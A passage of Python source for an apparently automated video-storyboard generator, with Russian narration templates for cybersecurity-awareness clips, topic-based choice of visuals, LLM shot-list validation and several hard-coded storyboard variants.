        ("SMS с кодом. От «банка». Не от банка.", "Не от банка"),
    ],
}

# Вредоносное ПО: вирусы, шифровальщики, эксплойты.
_NARR_MALWARE = {
    "hook": [
        ("{TOPIC}. Вирус уже внутри.", "ВИРУС УЖЕ ВНУТРИ"),
        ("Шифровальщик активирован. {TOPIC}.", "ШИФРОВАЛЬЩИК АКТИВЕН"),
        ("{TOPIC}. Ваш код скомпрометирован.", "КОД СКОМПРОМЕТИРОВАН"),
        ("Бэкдор в системе. {TOPIC}.", "БЭКДОР ОТКРЫТ"),
        ("{TOPIC}. Малварь маскируется под обновление.", "ПОДДЕЛЬНОЕ ОБНОВЛЕНИЕ"),
        ("Каждый файл зашифрован. {TOPIC}.", "ФАЙЛЫ ЗАШИФРОВАНЫ"),
    ],
    "problem": [
        ("Файл .exe. Настоящая иконка. Поддельный код.", "Поддельный код"),
        ("Обновление системы. Срочное. Настоящее?", "Не настоящее"),
        ("Скрипт на сайте. Запускается автоматически.", "Автозапуск"),
        ("Письмо с вложением. Документ. Почти.", "Почти документ"),
        ("Рекламный баннер. Внутри — эксплойт.", "Баннер с эксплойтом"),
        ("Приложение из неофициального магазина.", "Неофициальное"),
    ],
}

# Приватность: слежка, камеры, биометрия.
_NARR_PRIVACY = {
    "hook": [
        ("{TOPIC}. Вас watching. Всегда.", "ВАС НАБЛЮДАЮТ"),
        ("Камера в вашем кармане. {TOPIC}.", "КАМЕРА В КАРМАНЕ"),
        ("{TOPIC} — приватность иллюзорна.", "ПРИВАТНОСТЬ ИЛЛЮЗИЯ"),
        ("Каждое движение записано. {TOPIC}.", "ВСЁ ЗАПИСАНО"),
        ("{TOPIC}. Ваш телефон — шпион.", "ТЕЛЕФОН — ШПИОН"),
        ("Биометрия украдена. {TOPIC}.", "БИОМЕТРИЯ УКРАДЕНА"),
    ],
    "problem": [
        ("Приложение просит доступ к камере. Зачем?", "Зачем камера?"),
        ("Уведомление: «Вас ищут».", "Вас ищут"),
        ("Координаты переданы. Точно. Минуту назад.", "Координаты переданы"),
        ("Голосовой помощник слушает. Всегда.", "Слушает всегда"),
        ("Камера безопасности. В вашем доме. Чужая.", "Чужая камера"),
        ("QR-код. Сканируете. Он сканирует вас.", "Сканирует вас"),
    ],
}

_THEME_NARR = {
    "social":  _NARR_SOCIAL,
    "infra":   _NARR_INFRA,
    "finance": _NARR_FINANCE,
    "malware": _NARR_MALWARE,
    "privacy": _NARR_PRIVACY,
}


def extract_visual_theme(topic):
    """M23: анализ темы → список подходящих тем (social/infra/data/finance/malware/privacy).
    Возвращает список отсортированный по релевантности (первый = основной)."""
    t = (topic or "").lower()
    scores = {}
    for theme, keywords in _THEME_KW.items():
        s = sum(1 for kw in keywords if kw in t)
        if s > 0:
            scores[theme] = s
    if not scores:
        return []
    return [th for th, _ in sorted(scores.items(), key=lambda x: -x[1])]


def theme_painters(themes):
    """M24: темы → расширенный пул визуалов (12+ на тему, в порядке приоритета, без дублей)."""
    seen, out = set(), []
    for th in themes:
        for p in _THEME_PAINTERS_EXPANDED.get(th, _THEME_PAINTERS.get(th, [])):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out or list(PURE_TYPO_VISUALS | {"bokeh", "phone_dark", "keyboard",
                                            "server_rack", "eye"})


def theme_cameras(themes):
    """M23: темы → пул камер."""
    seen, out = set(), []
    for th in themes:
        for c in _THEME_CAMERAS.get(th, []):
            if c not in seen:
                seen.add(c)
                out.append(c)
    return out or ["push_in", "drift", "shake", "snap", "static"]


def theme_trans(themes):
    """M23: темы → пул переходов."""
    seen, out = set(), []
    for th in themes:
        for t_ in _THEME_TRANS.get(th, []):
            if t_ not in seen:
                seen.add(t_)
                out.append(t_)
    return out or ["hard_cut", "whip", "dip", "glitch", "zoom"]


# Safe area: текст НИКОГДА не выходит за эти границы (доля кадра 1080x1920).
SAFE_L = int(W * 0.09)          # 97 px слева/справа
SAFE_R = W - SAFE_L
SAFE_T = int(H * 0.08)          # 154 px сверху/снизу
SAFE_B = H - SAFE_T
SAFE_W = SAFE_R - SAFE_L        # 886 px под текст


def set_aspect(mode="9:16"):
    """M20 (longform/YouTube): переключает холст 1080x1920 <-> 1920x1080.

    Художники читают W/H/SAFE_* как globals при каждом кадре, поэтому
    переключение живое. Шрифты в px не меняются (на 1080p высоте текст
    относительно крупнее — для сабов/карточек это ок).
    """
    global W, H, SAFE_L, SAFE_R, SAFE_T, SAFE_B, SAFE_W
    if mode == "16:9":
        W, H = 1920, 1080
    else:
        W, H = 1080, 1920
    SAFE_L = int(W * 0.09)
    SAFE_R = W - SAFE_L
    SAFE_T = int(H * 0.08)
    SAFE_B = H - SAFE_T
    SAFE_W = SAFE_R - SAFE_L
    return W, H


def _text_chars(s):
    """Все символы экранного текста шота (ударные + субтитр)."""
    n = 0
    for t in (s.get("texts") or []):
        for ln in (t.get("lines") or []):
            n += len(str(ln))
    if s.get("sub"):
        n += len(str(s["sub"]))
    return n


def _min_dur(s):
    """Минимум длительности шота (M15, TikTok-читаемость): текст на экране
    должен успеть прочитаться (~14 символов/сек + запас)."""
    typ = s.get("type", "cinematic")
    chars = _text_chars(s)
    read = chars / 14.0 + 0.5 if chars else 0.0
    if typ == "typography":
        return max(0.9, read)
    if typ == "graphic":
        return max(0.4, read)
    return max(0.6, read)


def _coerce_shots(raw, seconds):
    """Проверяет и нормализует список шотов от LLM. Бросает ValueError."""
    if not isinstance(raw, list) or not raw:
        raise ValueError("пустой shot list")
    shots = []
    for i, s in enumerate(raw[:40]):
        if not isinstance(s, dict):
            continue
        vis = s.get("visual") if s.get("visual") in _VALID["visual"] else "bokeh"
        texts = []
        for t in (s.get("texts") or [])[:2]:
            if not isinstance(t, dict):
                continue
            # короткие строки: типографика — 1-3 слова, не фразы на весь экран
            lines = [str(x).upper().strip()[:24] for x in (t.get("lines") or [])][:3]
            lines = [l for l in lines if l]
            if not lines:
                continue
            mode = t.get("mode") if t.get("mode") in _VALID["mode"] else "pop"
            texts.append({"lines": lines, "mode": mode})
        try:
            dur = float(s.get("dur", 1.5))
        except (TypeError, ValueError):
            dur = 1.5
        dur = max(0.3, min(8.0, dur))
        sp = s.get("speed") or [1.0, 1.0]
        try:
            speed = (max(0.2, min(3.0, float(sp[0]))), max(0.2, min(3.0, float(sp[1]))))
        except (TypeError, ValueError, IndexError):
            speed = (1.0, 1.0)
        cam = s.get("camera") if s.get("camera") in _VALID["camera"] else "push_in"
        tr = s.get("trans_out") if s.get("trans_out") in _VALID["trans_out"] else "hard_cut"
        typ = s.get("type") if s.get("type") in _VALID["type"] else None
        if typ is None:
            # автотип: чисто текстовый фон + текст = typography,
            # текст поверх кинокадра = cinematic (текст подчёркивает видео)
            typ = "typography" if (texts and vis in PURE_TYPO_VISUALS) else "cinematic"
        voice = str(s.get("voice") or "").strip()[:140]
        sub = str(s.get("sub") or "").strip()[:70]
        # субтитр — только поверх кинокадра (TikTok: по центру, спокойный);
        # на ударных текстовых вставках субтитр не нужен (там уже текст)
        subs = ([{"lines": [sub], "mode": "sub"}]
                if (sub and typ == "cinematic") else [])
        shots.append({
            "id": f"S{i + 1:02d}",
            "act": s.get("act") if s.get("act") in _VALID["act"] else "problem",
            "type": typ,
            "dur": dur,
            "visual": vis,
            "camera": cam,
            "texts": texts,
            "subs": subs,
            "sub": sub,
            "voice": voice,
            "trans_out": tr,
            "sfx": s.get("sfx") if s.get("sfx") in _VALID["sfx"] else "none",
            "speed": speed,
            "accent": "accent2" if s.get("accent") == "accent2" else "accent",
            "fx": "glitch" if s.get("trans_out") == "glitch" else "",
            "seed": 1000 + i * 77,
        })
    if len(shots) < 4:
        raise ValueError("слишком мало шотов")
    # масштабируем длительности под целевую длину, но не ниже минимума
    # читаемости (M15): текст должен успеть прочитаться
    total = sum(s["dur"] for s in shots)
    k = seconds / max(0.1, total)
    for s in shots:
        s["dur"] = max(_min_dur(s), s["dur"] * k)
    total = sum(s["dur"] for s in shots)
    if total > seconds:
        k2 = seconds / total
        for s in shots:
            s["dur"] = max(0.4, s["dur"] * k2)
    return shots


def template_shots(topic, seconds=55, style_name="cybersecurity_cinematic",
                   variant=None):
    """Fallback-план: драматургия hook->problem->escalation->peak->twist->
    accel->climax, тексты и визуальный ряд собираются ПОД ТЕМУ topic.

    M23: визуалы/камеры/переходы выбираются из тематических пулов.
    Oзвучка из модульных dict с {TOPIC} placeholder (мгновенная подстановка).
    """
    topic = (topic or "Как вас взламывают").strip()
    short = topic[:48]
    rnd = random.Random(abs(hash(topic)) % (2 ** 32))
    k = max(0.4, seconds / 42.0)

    # S26.4.1: 8 структурных вариантов раскадровки; topic-детерминированный выбор.
    # variant=0 — эталон, 1 — двойная проблема, 2 — ранний пик, 3 — вопрос-открытие,
    # 4 — cold-open-климакс, 5 — нарратор-док, 6 — rapid-fire, 7 — твист в начале.
    if variant is None:
        variant = abs(hash(topic)) % 8

    # M23: тематический анализ → выбор пулов
    themes = extract_visual_theme(topic)
    pv = theme_painters(themes)   # ordered list of visual names
    cm = theme_cameras(themes)    # ordered list of camera names
    tr = theme_trans(themes)      # ordered list of transition names

    def sc(act, dur, visual, camera, texts, trans_out, sfx="none",
           speed=(1.0, 1.0), accent="accent", fx="", typ=None,
           voice="", sub=""):
        if typ is None:
            typ = ("typography"
                   if (texts and visual in PURE_TYPO_VISUALS) else "cinematic")
        subs = ([{"lines": [sub[:70]], "mode": "sub"}]
                if (sub and typ == "cinematic") else [])
        return {"act": act, "dur": dur, "visual": visual, "camera": camera,
                "texts": texts, "subs": subs, "sub": sub[:70], "voice": voice[:140],
                "trans_out": trans_out, "sfx": sfx,
                "speed": speed, "accent": accent, "fx": fx, "type": typ}

    def tx(*lines, mode="pop"):
        return [{"lines": [l.upper().strip()[:24] for l in lines], "mode": mode}]

    # M24: тематические визуалы — пул расширен (12+ на тему),
    # порядок определяется хэшем темы (каждое видео = разные визуалы)
    _pv = pv  # ordered list from expanded pool
    _cam = lambda i: cm[i % len(cm)]
    _tr_ = lambda i: tr[i % len(tr)]

    # M24: topic-hash offset — каждое видео начинает с разного визуала
    _voff = abs(hash(topic)) % max(1, len(_pv))
    def _pv_(i):
        return _pv[(_voff + i) % len(_pv)]

    peak_pool = [_pv_((i * 3 + _voff)) for i in range(8)]
    rnd.shuffle(peak_pool)

    # S26.4.1: альтернативные структурные раскадровки (variant != 0).
    # Только существующие визуалы/камеры/переходы; финал всегда final_brand.
    def _v1_shots():
        # 1 — «Двойная проблема»: две волны бытовых угроз + ускорение.
        return [
            sc("hook", 2.8 * k, _pv_(0), _cam(0),
               tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("problem", 1.7 * k, _pv_(1), _cam(1), [], _tr_(1),
               "notify", (1.0, 1.2)),
            sc("problem", 0.9 * k, "flash", "static",
               tx("ОДНА ССЫЛКА", mode="pop"), "hard_cut", "click",
               typ="typography"),
            sc("problem", 1.5 * k, _pv_(2), _cam(2), [], "match",
               "notify", (1.0, 1.1)),
            sc("problem", 0.9 * k, "flash", "static",
               tx("ОДИН ЗВОНОК", mode="pop"), "hard_cut", "click",
               typ="typography"),
            sc("problem", 1.5 * k, _pv_(3), _cam(3), [], _tr_(2),
               "whoosh", (1.1, 1.3)),
            sc("problem", 0.9 * k, "flash", "static",
               tx("ЕЩЁ ОДНА ССЫЛКА", mode="pop"), "hard_cut", "impact",
               typ="typography"),
            sc("problem", 1.4 * k, _pv_(4), _cam(4), [], _tr_(3),
               "notify", (0.9, 1.1)),
            sc("problem", 0.9 * k, "flash", "static",
               tx("ЕЩЁ ОДИН ЗВОНОК", mode="pop"), "hard_cut", "bass",
               typ="typography"),
            sc("escalation", 1.2 * k, "keyboard", _cam(5), [],
               "hard_cut", "click", (1.2, 1.6)),
            sc("escalation", 0.8 * k, "qr_scan", _cam(6), [],
               "hard_cut", "whoosh", (1.5, 2.0)),
            sc("escalation", 1.1 * k, _pv_(5), _cam(0), [], _tr_(4),
               "notify"),
            sc("escalation", 0.7 * k, "flash", "static",
               tx("ДОСТУП", mode="pop"), "hard_cut", "bass", typ="typography"),
            sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
               "match", "riser", (0.9, 1.5)),
            sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
               "impact", (1.4, 1.4), "accent2", typ="graphic"),
            sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.7 * k, peak_pool[2], "push_in", [], "whip",
               "bass", (1.5, 1.5)),
            sc("peak", 0.5 * k, peak_pool[3], "snap", [], "hard_cut",
               "whoosh", (1.8, 1.8)),
            sc("peak", 0.8 * k, peak_pool[4], "shake",
               tx("СЕССИЯ УКРАДЕНА", mode="tracking"), "glitch", "impact",
               (1.3, 1.3), "accent2", fx="glitch"),
            sc("twist", 1.6 * k, "pause_black", "static",
               tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 1.2 * k, "pause_black", "static", [], "dip",
               "silence", (0.3, 0.3)),
            sc("twist", 2.0 * k, "eye", _cam(3),
               tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
               "impact", (0.5, 1.8)),
            sc("accel", 1.6 * k, "keyboard", _cam(0),
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 1.3 * k, "consequence", _cam(1),
               tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
            sc("accel", 1.2 * k, "consequence", _cam(2),
               tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
            sc("accel", 1.8 * k, "consequence", _cam(3),
               tx("ВСЯ СИСТЕМА", mode="tracking"), "zoom", "riser",
               (0.8, 1.6), "accent2"),
            sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 0.5 * k, _pv_(6), "snap", [], "hard_cut",
               "bass", (1.4, 1.4)),
            sc("climax", 2.0 * k, "final_q", "static",
               tx("КТО КОГО", mode="whisper"), "dip", "bass", (0.6, 0.8),
               typ="typography"),
            sc("climax", 2.4 * k, "final_q", "static",
               tx("ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence",
               (0.5, 0.6), typ="typography"),
            sc("climax", 3.4 * k, "final_brand", "push_out", [], "hard_cut",
               "impact", (0.7, 1.0), typ="graphic"),
        ]

    def _v2_shots():
        # 2 — «Ранний пик»: максимум динамики сразу после hook.
        return [
            sc("hook", 2.8 * k, _pv_(0), _cam(0),
               tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
               "impact", (1.4, 1.4), "accent2", typ="graphic"),
            sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.7 * k, peak_pool[2], "push_in", [], "whip",
               "bass", (1.5, 1.5)),
            sc("peak", 0.5 * k, peak_pool[3], "snap", [], "hard_cut",
               "whoosh", (1.8, 1.8)),
            sc("peak", 0.8 * k, peak_pool[4], "shake",
               tx("СЕССИЯ УКРАДЕНА", mode="tracking"), "glitch", "impact",
               (1.3, 1.3), "accent2", fx="glitch"),
            sc("problem", 1.7 * k, _pv_(1), _cam(1), [], _tr_(1),
               "notify", (1.0, 1.2)),
            sc("problem", 1.5 * k, _pv_(2), _cam(2), [], "match",
               "notify", (1.0, 1.1)),
            sc("problem", 1.5 * k, _pv_(3), _cam(3), [], _tr_(2),
               "whoosh", (1.1, 1.3)),
            sc("escalation", 1.2 * k, "keyboard", _cam(5), [],
               "hard_cut", "click", (1.2, 1.6)),
            sc("escalation", 0.8 * k, "qr_scan", _cam(6), [],
               "hard_cut", "whoosh", (1.5, 2.0)),
            sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
               "match", "riser", (0.9, 1.5)),
            sc("twist", 1.6 * k, "pause_black", "static",
               tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 2.0 * k, "eye", _cam(3),
               tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
               "impact", (0.5, 1.8)),
            sc("accel", 1.6 * k, "keyboard", _cam(0),
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 1.3 * k, "consequence", _cam(1),
               tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
            sc("accel", 1.2 * k, "consequence", _cam(2),
               tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
            sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 0.5 * k, _pv_(6), "snap", [], "hard_cut",
               "bass", (1.4, 1.4)),
            sc("climax", 2.0 * k, "final_q", "static",
               tx("КТО КОГО", mode="whisper"), "dip", "bass", (0.6, 0.8),
               typ="typography"),
            sc("climax", 2.4 * k, "final_q", "static",
               tx("ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence",
               (0.5, 0.6), typ="typography"),
            sc("climax", 3.4 * k, "final_brand", "push_out", [], "hard_cut",
               "impact", (0.7, 1.0), typ="graphic"),
        ]

    def _v3_shots():
        # 3 — «Вопрос-открытие»: риторический вопрос с первых секунд.
        return [
            sc("hook", 2.4 * k, "final_q", "static",
               tx("КТО КОГО", "ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence",
               (0.5, 0.6), typ="typography"),
            sc("hook", 2.8 * k, _pv_(0), _cam(0),
               tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("problem", 1.7 * k, _pv_(1), _cam(1), [], _tr_(1),
               "notify", (1.0, 1.2)),
            sc("problem", 1.5 * k, _pv_(2), _cam(2), [], "match",
               "notify", (1.0, 1.1)),
            sc("problem", 1.5 * k, _pv_(3), _cam(3), [], _tr_(2),
               "whoosh", (1.1, 1.3)),
            sc("escalation", 1.2 * k, "keyboard", _cam(5), [],
               "hard_cut", "click", (1.2, 1.6)),
            sc("escalation", 0.8 * k, "qr_scan", _cam(6), [],
               "hard_cut", "whoosh", (1.5, 2.0)),
            sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
               "match", "riser", (0.9, 1.5)),
            sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
               "impact", (1.4, 1.4), "accent2", typ="graphic"),
            sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.7 * k, peak_pool[2], "push_in", [], "whip",
               "bass", (1.5, 1.5)),
            sc("peak", 0.5 * k, peak_pool[3], "snap", [], "hard_cut",
               "whoosh", (1.8, 1.8)),
            sc("twist", 1.6 * k, "pause_black", "static",
               tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 2.0 * k, "eye", _cam(3),
               tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
               "impact", (0.5, 1.8)),
            sc("accel", 1.6 * k, "keyboard", _cam(0),
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 1.3 * k, "consequence", _cam(1),
               tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
            sc("accel", 1.2 * k, "consequence", _cam(2),
               tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
            sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 0.5 * k, _pv_(6), "snap", [], "hard_cut",
               "bass", (1.4, 1.4)),
             sc("climax", 3.4 * k, "final_brand", "push_out", [], "hard_cut",
                "impact", (0.7, 1.0), typ="graphic"),
        ]

    def _v4_shots():
        # 4 — «Cold-open-климакс»: открытие кульминацией, затем раскрытие.
        return [
            sc("climax", 2.2 * k, "attack_grid", "shake",
               tx("ВСЁ УЖЕ", "СЛУЧИЛОСЬ", mode="tracking"), "glitch",
               "impact", (1.3, 1.3), "accent2", typ="graphic"),
            sc("climax", 0.5 * k, _pv_(6), "snap", [], "hard_cut",
               "bass", (1.4, 1.4)),
            sc("climax", 2.0 * k, "final_q", "static",
               tx("КТО КОГО", mode="whisper"), "dip", "bass", (0.6, 0.8),
               typ="typography"),
            sc("climax", 2.4 * k, "final_q", "static",
               tx("ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence",
               (0.5, 0.6), typ="typography"),
            sc("hook", 2.8 * k, _pv_(0), _cam(0),
               tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("problem", 1.7 * k, _pv_(1), _cam(1), [], _tr_(1),
               "notify", (1.0, 1.2)),
            sc("problem", 1.5 * k, _pv_(2), _cam(2), [], "match",
               "notify", (1.0, 1.1)),
            sc("problem", 1.5 * k, _pv_(3), _cam(3), [], _tr_(2),
               "whoosh", (1.1, 1.3)),
            sc("escalation", 1.2 * k, "keyboard", _cam(5), [],
               "hard_cut", "click", (1.2, 1.6)),
            sc("escalation", 0.8 * k, "qr_scan", _cam(6), [],
               "hard_cut", "whoosh", (1.5, 2.0)),
            sc("escalation", 1.6 * k, "server_corridor", _cam(1), [],
               "match", "riser", (0.9, 1.5)),
            sc("peak", 0.8 * k, peak_pool[0], "shake", [], "hard_cut",
               "impact", (1.4, 1.4), "accent2", typ="graphic"),
            sc("peak", 0.5 * k, peak_pool[1], "shake", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.7 * k, peak_pool[2], "push_in", [], "whip",
               "bass", (1.5, 1.5)),
            sc("twist", 1.6 * k, "pause_black", "static",
               tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 2.0 * k, "eye", _cam(3),
               tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
               "impact", (0.5, 1.8)),
            sc("accel", 1.6 * k, "keyboard", _cam(0),
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 1.3 * k, "consequence", _cam(1),
               tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
            sc("accel", 1.2 * k, "consequence", _cam(2),
               tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
            sc("climax", 0.7 * k, "attack_grid", "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 3.4 * k, "final_brand", "push_out", [], "hard_cut",
               "impact", (0.7, 1.0), typ="graphic"),
        ]

    def _v5_shots():
        # 5 — «Нарратор-док»: спокойнее, ×1.15 длительности, больше типографики.
        return [
            sc("hook", 3.2 * k, _pv_(0), "static",
               tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("problem", 1.95 * k, _pv_(1), "static", [], _tr_(1),
               "notify", (1.0, 1.2)),
            sc("problem", 1.7 * k, _pv_(2), "static", [], "match",
               "notify", (1.0, 1.1)),
            sc("problem", 1.7 * k, _pv_(3), "static", [], _tr_(2),
               "whoosh", (1.1, 1.3)),
            sc("problem", 1.4 * k, _pv_(4), "static",
               tx("ЭТО НЕ СЛУЧАЙНО", mode="pop"), "match", "notify",
               (0.9, 1.1), typ="typography"),
            sc("escalation", 1.4 * k, "keyboard", "static", [],
               "hard_cut", "click", (1.2, 1.6)),
            sc("escalation", 0.9 * k, "qr_scan", "static", [],
               "hard_cut", "whoosh", (1.5, 2.0)),
            sc("escalation", 1.8 * k, "server_corridor", "static", [],
               "match", "riser", (0.9, 1.5)),
            sc("peak", 0.9 * k, peak_pool[0], "push_in", [], "hard_cut",
               "impact", (1.4, 1.4), "accent2", typ="graphic"),
            sc("peak", 0.8 * k, peak_pool[1], "push_in", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.8 * k, peak_pool[2], "push_in", [], "whip",
               "bass", (1.5, 1.5)),
            sc("peak", 0.6 * k, peak_pool[3], "snap", [], "hard_cut",
               "whoosh", (1.8, 1.8)),
            sc("twist", 1.8 * k, "pause_black", "static",
               tx("НО САМОЕ", "СТРАШНОЕ...", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 2.3 * k, "eye", _cam(3),
               tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
               "impact", (0.5, 1.8)),
            sc("accel", 1.8 * k, "keyboard", _cam(0),
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 1.5 * k, "consequence", _cam(1),
               tx("1 АККАУНТ", mode="pop"), "match", "impact", (1.0, 1.4)),
            sc("accel", 1.4 * k, "consequence", _cam(2),
               tx("1 УСТРОЙСТВО", mode="pop"), "whip", "impact", (1.0, 1.6)),
            sc("accel", 2.1 * k, "consequence", _cam(3),
               tx("ВСЯ СИСТЕМА", mode="tracking"), "zoom", "riser",
               (0.8, 1.6), "accent2"),
            sc("climax", 0.8 * k, "attack_grid", "static", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 2.3 * k, "final_q", "static",
               tx("КТО КОГО", mode="whisper"), "dip", "bass", (0.6, 0.8),
               typ="typography"),
            sc("climax", 2.8 * k, "final_q", "static",
               tx("ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence",
               (0.5, 0.6), typ="typography"),
            sc("climax", 3.9 * k, "final_brand", "push_out", [], "hard_cut",
               "impact", (0.7, 1.0), typ="graphic"),
        ]

    def _v6_shots():
        # 6 — «Rapid-fire»: всё коротко ×0.7, все камеры shake/snap.
        return [
            sc("hook", 2.0 * k, _pv_(0), "shake",
               tx("ВАС УЖЕ", "ВЗЛОМАЮТ", mode="tracking"), "glitch",
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("problem", 1.2 * k, "flash", "snap", [], "hard_cut",
               "click", (1.2, 1.4)),
            sc("problem", 1.2 * k, "flash", "snap", [], "hard_cut",
               "notify", (1.0, 1.2)),
            sc("problem", 1.2 * k, "flash", "snap", [], "hard_cut",
               "click", (1.1, 1.3)),
            sc("escalation", 0.9 * k, "keyboard", "shake", [], "hard_cut",
               "click", (1.4, 1.6)),
            sc("escalation", 0.6 * k, "qr_scan", "snap", [], "whip",
               "whoosh", (1.5, 2.0)),
            sc("peak", 0.6 * k, peak_pool[0], "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("peak", 0.4 * k, peak_pool[1], "snap", [], "hard_cut",
               "click", (1.6, 1.6)),
            sc("peak", 0.5 * k, peak_pool[2], "shake", [], "whip",
               "bass", (1.5, 1.5)),
            sc("peak", 0.4 * k, peak_pool[3], "snap", [], "hard_cut",
               "whoosh", (1.8, 1.8)),
            sc("twist", 1.1 * k, "pause_black", "static",
               tx("И ВОТ", "ОНА", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 1.4 * k, "eye", "shake",
               tx("ДВЕРЬ ОТКРЫТА", mode="tracking"), "zoom", "impact",
               (0.5, 1.8)),
            sc("accel", 1.1 * k, "keyboard", "snap",
               tx("1 ОШИБКА", mode="pop"), "hard_cut", "bass", (1.0, 1.4)),
            sc("accel", 0.9 * k, "consequence", "shake",
               tx("АККАУНТ", mode="pop"), "whip", "impact", (1.0, 1.4)),
            sc("accel", 0.8 * k, "consequence", "snap",
               tx("УСТРОЙСТВО", mode="pop"), "hard_cut", "impact",
               (1.0, 1.6)),
            sc("accel", 1.3 * k, "consequence", "shake",
               tx("СИСТЕМА", mode="tracking"), "zoom", "riser", (0.8, 1.6),
               "accent2"),
            sc("climax", 0.5 * k, "attack_grid", "shake", [], "hard_cut",
               "impact", (1.5, 1.5), "accent2", typ="graphic"),
            sc("climax", 0.4 * k, _pv_(6), "snap", [], "hard_cut",
               "bass", (1.4, 1.4)),
            sc("climax", 1.4 * k, "final_q", "static",
               tx("КТО КОГО", "ЗАЩИЩАЕТ?", mode="whisper"), "dip", "silence",
               (0.5, 0.6), typ="typography"),
            sc("climax", 2.4 * k, "final_brand", "push_out", [], "hard_cut",
               "impact", (0.7, 1.0), typ="graphic"),
        ]

    def _v7_shots():
        # 7 — «Твист в начале»: твист сразу после hook, затем раскрытие.
        return [
            sc("hook", 2.8 * k, _pv_(0), _cam(0),
               tx("ВАС УЖЕ МОГУТ", "ВЗЛОМАТЬ", mode="tracking"), _tr_(0),
               "impact", (0.7, 1.3), "accent2", typ="typography"),
            sc("twist", 1.6 * k, "pause_black", "static",
               tx("САМОЕ", "СТРАШНОЕ", mode="reveal"), "dip", "silence",
               (0.4, 0.4), typ="typography"),
            sc("twist", 2.0 * k, "eye", _cam(3),
               tx("ОТКРОЕТЕ ДВЕРЬ", "ВЫ САМИ", mode="tracking"), "zoom",
               "impact", (0.5, 1.8)),
            sc("problem", 1.7 * k, _pv_(1), _cam(1), [], _tr_(1),
               "notify", (1.0, 1.2)),
